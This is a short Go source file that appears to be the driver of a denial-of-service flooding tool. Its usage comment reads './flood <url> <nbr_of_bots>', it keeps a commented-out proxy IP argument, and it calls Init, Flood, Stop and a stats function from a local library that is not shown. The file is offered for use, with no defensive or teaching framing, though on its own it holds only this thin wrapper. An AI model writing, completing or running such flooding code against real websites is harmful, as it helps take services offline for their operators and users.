package main

import "C"

import (
	"fmt"
	"time"

	F "./libs"
)

func mainer(url string, nbrB int64) {
	//usage :
	//      ./flood <url> <nbr_of_bots>
	//      proxyIp := args[3]
	fm, err := F.Init(url, nbrB)
	if err != nil {
		fmt.Println("Somthing wrong happend !")
		panic(err)
	}
	fm.Flood()
	time.Sleep(time.Second)
	fm.Stop()
	time.Sleep(time.Second)
	fm.Statss()
}
func main() {}
